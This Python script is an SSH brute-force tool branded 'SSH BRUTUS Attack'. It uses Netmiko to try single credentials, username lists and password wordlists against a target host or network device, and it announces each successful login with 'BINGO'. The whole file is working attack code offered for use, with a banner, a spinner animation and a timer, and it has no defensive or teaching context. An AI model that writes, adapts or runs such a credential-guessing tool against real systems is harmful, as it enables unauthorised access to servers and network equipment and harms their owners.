#!/usr/bin/python
import argparse
import time
import sys
from multiprocessing import Process
from netmiko import Netmiko
from pyfiglet import Figlet
from termcolor import colored
from datetime import datetime

time_start = datetime.now()
### special effects
### Service name:
name_app = str(sys.argv[0]) 
myversion="Version: 0.001" 
msg_nameservice = 'SSH' 
msg_font=('puffy')
msg_ast=colored('[*]', 'yellow')
msg_int=colored('[!]', 'blue')
msg_ok=colored('[+]', 'green')
msg_fail=colored('[-]', 'red')
msg_banner= msg_nameservice + "BRUTUS Attack" 
msg_banner_custom = Figlet(font=msg_font)
msg_banner_color=colored(msg_banner_custom.renderText(msg_banner), 'green')
### special effects
msg_usage=" \n Usase: " + name_app + " -t <target> -d <device> (optional) [ -u <username> | -U <userlist> ] [ -p <password> -w <wordlist.txt> ]"
msg_target="Name or IP Address"
msg_word="File with list of possible password" 
msg_user="Account name"
msg_userlist="File with list of possible account names" 
msg_device="Value default is Linux" 
msg_pass="Password"
msg_verbose="to define verbose mode" 
msg_version="Information about the  version" 
msg_start=" Please wait - Bruteforce attack running"
msg_method1=" Bruteforce " + msg_nameservice + " - based on only one an username and a password" 
msg_method2=" Bruteforce " + msg_nameservice + " - based on only one an username with dictonary (wordlist)" 
msg_method3=" Bruteforce " + msg_nameservice + " - based on an userlist file and a password" 
msg_method4=" Bruteforce " + msg_nameservice + " - based on an userlist and a wordlist" 
msg_method4_1=" This processo can demand more time, then please wait !" 

print(msg_banner_color)

bingo = False
verbose = False


###### pyrotechnics
animation = "|/-\\"
def anime_gambi():
    for i in range(1800):
        time.sleep(0.1)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()
        #print("END")

def version():
    print()
    print('=' * 60)
    print('====================================>', myversion)
    print('=' * 60)

def msg_attack():
    print(msg_ast + " " + msg_start)


######################################    
#### BRUTE FORCE ATTACK FUNCTION #####
################ BEGIN ###############    


def bruteforceattack(_target,_username,_password,_device,_verbose=False):
    try:
        sshconn = Netmiko(
            _target, 
            username=_username, 
            password=_password, 
            device_type=_device)
        
        
        sshconn.disconnect()
        print(msg_ok + " BINGO - Username: " + _username + " and Password: " + _password )
        return True
        
    except:
        if _verbose:
            print( msg_fail + " Fail - Username: " + _username + " and Password: " + _password )


################  END  ###############    
#### BRUTE FORCE ATTACK FUNCTION #####
######################################    



######################################    
#######  AUXILIARY FUNCTIONS #########
################ BEGIN ###############    


### Testing a specific user with password list
def user_wordlist(_target,_username,_device,_wordlist,_verbose):
    msg_attack()

    with open(_wordlist, "r") as _word:
        for _line in _word:
            _password = _line.strip("\n")
            bingo=bruteforceattack(_target,_username,_password,_device,_verbose)

            if bingo:
                break       
               
### Using a user list with password
def userlist_pass(_target,_password,_device,_userlist,_verbose):
    msg_attack()

    with open(_userlist, "r") as _word:
        for _line in _word:
            _username = _line.strip("\n")
            bruteforceattack(_target,_username,_password,_device,_verbose)

### Using a user list and also password list
def userlist_wordlist(_target,_device,_userlist,_wordlist,_verbose):
    msg_attack()

    with open(_userlist, "r") as _word:
        for _line in _word:
            _username = _line.strip("\n")

            with open(_wordlist, "r") as _word:
                for _line in _word:
                    _password = _line.strip("\n")
                    bingo=bruteforceattack(_target,_username,_password,_device,_verbose)

                    if bingo:
                      break  

################ END   ###############    
#######  AUXILIAEY FUNCTIONS #########
######################################    


######################################    
##########  MAIN FUNCTION ############
################ BEGIN ###############    
#### Receivend and treating options / params

def brute_main():
    option = argparse.ArgumentParser(description=msg_usage)
    option.add_argument("-t","--target" ,  dest="target", help=msg_target)

    useroptions = option.add_mutually_exclusive_group()
    useroptions.add_argument("-u","--user" ,  dest="user", help=msg_user)
    useroptions.add_argument("-U","--userlist" ,  dest="userlist", help=msg_userlist)

    option.add_argument("-d","--device",default="linux",  dest="devicetype", help=msg_device, type=str)

    worlistoptions = option.add_mutually_exclusive_group()
    worlistoptions.add_argument("-W","--wordlist", dest="wordlist", help=msg_word)
    worlistoptions.add_argument("-p","--password", dest="password", help=msg_pass)

    option.add_argument("-v","--verbose",  dest="verbose", help=msg_verbose, action='store_true')
    option.add_argument("-V","--version",dest="version", help=msg_version, action='store_true')

    option_args = option.parse_args()

    username=str(option_args.user)
    userlist=option_args.userlist
    target=option_args.target
    device=str(option_args.devicetype)
    wordlist=option_args.wordlist
    password=option_args.password
    verbose=option_args.verbose

    if option_args.version:
        version()

    if option_args.target == None:
        print(option.description)
        exit(0)

    if option_args.user == None and option_args.userlist == None:
        print(option.description)
        exit(0)

    if option_args.wordlist == None and option_args.password == None:
        print(option.description)
        exit(0)

    if option_args.user != None and option_args.password != None:
        print(msg_int + msg_method1)
        bruteforceattack(target,username,password,device)

    if option_args.user != None and option_args.wordlist != None:
        print(msg_int + msg_method2)
        user_wordlist(target,username,device,wordlist,verbose)
    
    if option_args.userlist != None and option_args.password != None:
        print(msg_int + msg_method3)
        userlist_pass(target,password,device,userlist,verbose)

    if option_args.userlist != None and option_args.wordlist != None:
        print(msg_int + msg_method4)
        print(msg_int + msg_method4_1)
        func1 = Process(target=anime_gambi)
        func1.start()

        func2 = Process(target=userlist_wordlist(target,device,userlist,wordlist,verbose))
        func2.start()

        func1.join()
        func2.join()
##############  END  #################    
##########  MAIN FUNCTION ############
######################################   


if __name__ == '__main__':
    brute_main()
    time_end = datetime.now()
    time_attack = time_end - time_start
    print("\n" + msg_ast + " Time of attack was => " + str(time_attack))
    exit(0)

